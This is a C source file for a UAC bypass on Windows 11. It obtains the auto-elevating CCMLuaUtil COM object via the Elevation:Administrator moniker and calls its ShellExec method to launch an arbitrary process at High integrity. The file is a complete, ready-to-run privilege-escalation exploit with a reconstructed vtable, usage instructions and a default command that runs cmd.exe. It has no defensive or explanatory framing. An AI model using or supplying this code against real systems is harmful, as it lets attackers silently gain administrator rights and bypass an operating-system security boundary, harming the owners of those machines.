/*
 * cmlua_bypass.c — UAC bypass via CCMLuaUtil::ShellExec (Windows 11 26200)
 *
 * CLSID: {3E000D72-A845-4CD9-BD83-80C07C3B881F}  (cmlua.dll, Elevation\Enabled=1)
 * IID:   {6EDD6D74-C007-4E75-B76A-E5740995E24C}  (ICMLuaUtil, confirmed via IDA)
 *
 * The CCMLuaUtil COM class auto-elevates for admin users at Medium IL.
 * ShellExec() calls ShellExecuteExW at High IL → arbitrary process execution.
 *
 * Usage: cmlua_bypass.exe "C:\Windows\System32\cmd.exe" "/c whoami /priv > C:\ProgramData\lpe_elev.txt"
 */

#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <stdio.h>

/* CLSID and IID from registry + IDA analysis */
static const CLSID CLSID_CCMLuaUtil = {
    0x3E000D72, 0xA845, 0x4CD9,
    { 0xBD, 0x83, 0x80, 0xC0, 0x7C, 0x3B, 0x88, 0x1F }
};

static const IID IID_ICMLuaUtil = {
    0x6EDD6D74, 0xC007, 0x4E75,
    { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C }
};

static const IID IID_ICMLuaUtil2 = {
    0xD4309536, 0xE369, 0x4241,
    { 0xA4, 0xDD, 0x3D, 0x10, 0xA2, 0x57, 0xA1, 0xC2 }
};

/* ICMLuaUtil vtable (manually constructed from IDA analysis of cmlua.dll)
 * Method order determined from CCMLuaUtil class in cmlua.dll:
 * [0] QueryInterface  [1] AddRef  [2] Release
 * [3] SetRasCredentials
 * [4] SetRasEntryProperties
 * [5] DeleteRasEntry
 * [6] DeleteRasSubEntry
 * [7] SetRasSubEntryProperties
 * [8] LaunchInfSection
 * [9] LaunchInfSectionEx
 * [10] CreateLayerDirectory
 * [11] CreateFileAndClose
 * [12] DeleteHiddenCmProfileFiles
 * [13] DeleteRasEntries (?)
 * [14] SetRegistryStringValue
 * [15] DeleteRegistryStringValue
 * [16] DeleteRegKeysWithoutSubKeys
 * [17] DeleteRegTree
 * [18] ExitWindowsFunc
 * [19] AllowAccessToTheWorld
 * [20] SetCustomAuthData
 * [21] CallCustomActionDll
 * [22] RunCustomActionExe
 * [23] ShellExec
 */
typedef struct ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICMLuaUtil*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICMLuaUtil*);
    /* 3..22: skip with function pointers */
    HRESULT (STDMETHODCALLTYPE *SetRasCredentials)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, BOOL);
    HRESULT (STDMETHODCALLTYPE *SetRasEntryProperties)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPWSTR*, DWORD);
    HRESULT (STDMETHODCALLTYPE *DeleteRasEntry)(ICMLuaUtil*, LPCWSTR, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *DeleteRasSubEntry)(ICMLuaUtil*, LPCWSTR, LPCWSTR, ULONG);
    HRESULT (STDMETHODCALLTYPE *SetRasSubEntryProperties)(ICMLuaUtil*, LPCWSTR, LPCWSTR, ULONG, LPWSTR*, DWORD);
    HRESULT (STDMETHODCALLTYPE *LaunchInfSection)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, BOOL);
    HRESULT (STDMETHODCALLTYPE *LaunchInfSectionEx)(ICMLuaUtil*, LPCWSTR, LPCWSTR, ULONG);
    HRESULT (STDMETHODCALLTYPE *CreateLayerDirectory)(ICMLuaUtil*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *CreateFileAndClose)(ICMLuaUtil*, LPCWSTR, DWORD, DWORD, DWORD, DWORD);
    HRESULT (STDMETHODCALLTYPE *DeleteHiddenCmProfileFiles)(ICMLuaUtil*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *DeleteRasEntries)(ICMLuaUtil*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *SetRegistryStringValue)(ICMLuaUtil*, HKEY, LPCWSTR, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *DeleteRegistryStringValue)(ICMLuaUtil*, HKEY, LPCWSTR, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *DeleteRegKeysWithoutSubKeys)(ICMLuaUtil*, HKEY, LPCWSTR, BOOL);
    HRESULT (STDMETHODCALLTYPE *DeleteRegTree)(ICMLuaUtil*, HKEY, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *ExitWindowsFunc)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *AllowAccessToTheWorld)(ICMLuaUtil*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *SetCustomAuthData)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, ULONG);
    HRESULT (STDMETHODCALLTYPE *CallCustomActionDll)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, PULONG);
    HRESULT (STDMETHODCALLTYPE *RunCustomActionExe)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPWSTR*);
    HRESULT (STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil*, LPCWSTR lpFile, LPCWSTR lpParams, LPCWSTR lpDir, ULONG fMask, UINT nShow);
} ICMLuaUtilVtbl;

struct ICMLuaUtil { ICMLuaUtilVtbl *lpVtbl; };

static ICMLuaUtil *GetElevatedCMLuaUtil(void)
{
    WCHAR monikerStr[256];
    WCHAR clsidStr[64];
    StringFromGUID2(&CLSID_CCMLuaUtil, clsidStr, 64);
    _snwprintf(monikerStr, 256, L"Elevation:Administrator!new:%s", clsidStr);

    ICMLuaUtil *pUtil = NULL;
    BIND_OPTS3 bo = {0};
    bo.cbStruct     = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    HRESULT hr = CoGetObject(monikerStr, (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pUtil);
    if (FAILED(hr)) {
        wprintf(L"[-] CoGetObject failed: 0x%08X\n", hr);
        /* try IID_ICMLuaUtil2 */
        hr = CoGetObject(monikerStr, (BIND_OPTS*)&bo, &IID_ICMLuaUtil2, (void**)&pUtil);
        if (FAILED(hr)) {
            wprintf(L"[-] CoGetObject IID2 also failed: 0x%08X\n", hr);
            return NULL;
        }
        wprintf(L"[+] Got ICMLuaUtil2 interface\n");
    } else {
        wprintf(L"[+] Got ICMLuaUtil interface\n");
    }
    return pUtil;
}

int wmain(int argc, wchar_t *argv[])
{
    LPCWSTR lpFile   = (argc > 1) ? argv[1] : L"C:\\Windows\\System32\\cmd.exe";
    LPCWSTR lpParams = (argc > 2) ? argv[2] : L"/c \"whoami /groups /priv > C:\\ProgramData\\lpe_elev.txt 2>&1\"";
    LPCWSTR lpDir    = NULL;

    wprintf(L"[*] cmlua_bypass — CCMLuaUtil::ShellExec UAC bypass\n");
    wprintf(L"[*] CLSID: {3E000D72-A845-4CD9-BD83-80C07C3B881F}\n");
    wprintf(L"[*] IID:   {6EDD6D74-C007-4E75-B76A-E5740995E24C}\n");
    wprintf(L"[*] File:  %s\n", lpFile);
    wprintf(L"[*] Params: %s\n", lpParams);

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        wprintf(L"[-] CoInitializeEx failed: 0x%08X\n", hr);
        return 1;
    }

    ICMLuaUtil *pUtil = GetElevatedCMLuaUtil();
    if (!pUtil) {
        CoUninitialize();
        return 1;
    }

    wprintf(L"[*] Calling ShellExec at High IL...\n");
    hr = pUtil->lpVtbl->ShellExec(pUtil, lpFile, lpParams, lpDir,
                                   0 /* fMask */, 1 /* SW_SHOWNORMAL */);
    if (SUCCEEDED(hr)) {
        wprintf(L"[+] ShellExec succeeded (hr=0x%08X)\n", hr);
    } else {
        wprintf(L"[-] ShellExec failed: 0x%08X\n", hr);
    }

    pUtil->lpVtbl->Release(pUtil);
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : 1;
}
